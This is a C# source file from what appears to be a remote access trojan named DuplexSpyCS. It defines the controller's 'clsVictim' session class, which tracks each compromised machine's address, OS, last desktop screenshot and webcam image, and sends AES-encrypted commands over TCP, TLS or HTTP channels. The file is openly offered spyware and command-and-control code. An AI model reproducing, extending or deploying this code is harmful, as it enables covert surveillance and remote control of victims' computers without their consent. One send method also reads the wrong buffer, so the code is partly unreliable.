using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using DuplexSpyCS;
using System.Net.Security;
using static DuplexSpyCS.clsHttpListener;

public class clsVictim
{
    //SOCKET
    public clsListener m_listener { get; init; }
    public Socket socket { get; init; }
    public SslStream m_sslClnt { get; init; }

    public static int MAX_BUFFER_LENGTH = 65536; //Buffer size.
    public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
    public string ID; //VICTIM ONLINE ID
    public string r_addr; //REMOTE IP ADDRESS
    public int r_port; //REMOTE PORT
    public bool unix_like; //VICTIM UNIX LIKE ?

    //LATENCY
    public DateTime last_sent;
    public int latency_time = 100;

    //CRYPTOGRAPHY
    public (string public_key, string private_key) key_pairs;
    public (byte[] key, byte[] iv) _AES;
    public string challenge_text;

    //STATUS
    public int _received_bytes = 0;
    public int ReceivedBytes { get { return _received_bytes; } }
    public int _sent_bytes = 0;
    public int SentBytes { get { return _sent_bytes; } }

    //Lock
    private readonly SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
    private readonly SemaphoreSlim _sslSemaphore = new SemaphoreSlim(1, 1);

    //FOLDER
    public string dir_victim;

    //OS
    public string remoteOS;

    //DESKTOP
    public Image img_LastDesktop;

    //WEBCAM
    public Image img_LastWebcam;

    //HTTP
    private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();

    public Dictionary<string, List<clsPlugin.stCommandSpec>> m_dicCommandRegistry = new();

    public clsVictim(clsListener listener, Socket socket)
    {
        if (socket == null)
        {
            MessageBox.Show("Socket is null.", "class Victim", MessageBoxButtons.OK, MessageBoxIcon.Error);
            clsStore.sql_conn.WriteErrorLogs(this, "Null socket");
            return;
        }

        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        this.socket = socket;
        r_addr = split[0];
        r_port = int.Parse(split[1]);
        ID = "[NOT YET]";
        m_listener = listener;
    }

    public clsVictim(Socket sktClnt, SslStream sslStream, clsListener listener)
    {
        socket = sktClnt;
        m_sslClnt = sslStream;
        m_listener = listener;

        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        r_addr = split[0];
        r_port = int.Parse(split[1]);
        ID = "[NOT YET]";
    }

    public void Send(int Command, int Param, string data)
    {
        Send(Command, Param, Encoding.UTF8.GetBytes(data));
    }
    public async void Send(int Command, int Param, byte[] buffer)
    {
        if (buffer != null)
        {
            try
            {
                buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();

                await _tcpSemaphore.WaitAsync();

                try
                {
                    int nOffset = 0;
                    while (nOffset < buffer.Length)
                    {
                        int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
                        nOffset += nSent;
                    }
                }
                catch (Exception ex)
                {
                    clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
                }
                finally
                {
                    _tcpSemaphore.Release();
                }

                clsStore.sent_bytes += buffer.Length;
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
            }
        }
    }
    public async Task Send(byte[] abBuffer)
    {
        if (abBuffer == null)
            return;

        await _tcpSemaphore.WaitAsync();

        try
        {
            int nOffset = 0;
            while (nOffset < buffer.Length)
            {
                int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
                nOffset += nSent;
            }
        }
        catch (Exception ex)
        {
            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
        }
        finally
        {
            _tcpSemaphore.Release();
        }
    }

    public void encSend(int Command, int Param, string data)
    {
        new Thread(() =>
        {
            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(Command, Param, enc_data);

            /*
            if (Command == 2 && Param != 1)
                clsStore.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
            */
        }).Start();
    }
    public void SendCommand(string command)
    {
        switch (m_listener.m_protocol)
        {
            case enListenerProtocol.TCP:
                encSend(2, 0, command);
                break;
            case enListenerProtocol.TLS:
                fnSslSend(command);
                break;
            case enListenerProtocol.HTTP:
                var listener = (clsHttpListener)m_listener;
                var pkt = new clsHttpResp(2, 0, Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv)));
                fnEnqueue(pkt);
                break;
        }
    }

    public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
    public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
    public void fnSendCommand(List<string> lsMsg) => SendCommand(string.Join("|", lsMsg));

    public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|'));
    public void fnSslSend(string[] asMsg) => fnSslSend(asMsg.ToList());
    public async void fnSslSend(List<string> lsMsg)
    {
        string szMsg = string.Join("|", lsMsg);
        byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);

        clsDSP dsp = new clsDSP(0, 0, abMsg);
        byte[] abBuffer = dsp.GetBytes();

        await fnSslSendRaw(abBuffer);
    }

    /// <summary>
    /// Send SSL raw data.
    /// </summary>
    /// <param name="abBuffer"></param>
    public async Task fnSslSendRaw(byte[] abBuffer)
    {
        await _sslSemaphore.WaitAsync();
        try
        {
            await m_sslClnt.WriteAsync(abBuffer, 0, abBuffer.Length);
            //await m_sslClnt.FlushAsync();
        }
        catch (Exception ex)
        {
            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
        }
        finally
        {
            _sslSemaphore.Release();
        }
    }

    public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);
    public void fnHttpSend(int nCmd, int nParam, string szMsg)
    {
        var listener = (clsHttpListener)m_listener;
        var resp = new clsHttpResp(nCmd, nParam, szMsg);
        
        fnEnqueue(resp);
    }
    public void fnHttpSend(int nCmd, int nParam, byte[] abMsg)
    {
        var listener = (clsHttpListener)m_listener;
        var resp = new clsHttpResp(nCmd, nParam, abMsg);

        fnEnqueue(resp);
    }

    public void fnEnqueue(clsHttpResp resp)
    {
        m_qResponse.Enqueue(resp);
    }

    public clsHttpResp fnGetResponse()
    {
        if (m_qResponse.Count == 0)
        {
            return new clsHttpResp(3, 0, "HTTP 500://Server internal error.");
        }
        else
        {
            return m_qResponse.Dequeue();
        }
    }

    public void Reconnect()
    {

    }

    public void Disconnect()
    {
        socket.Close();
    }
}
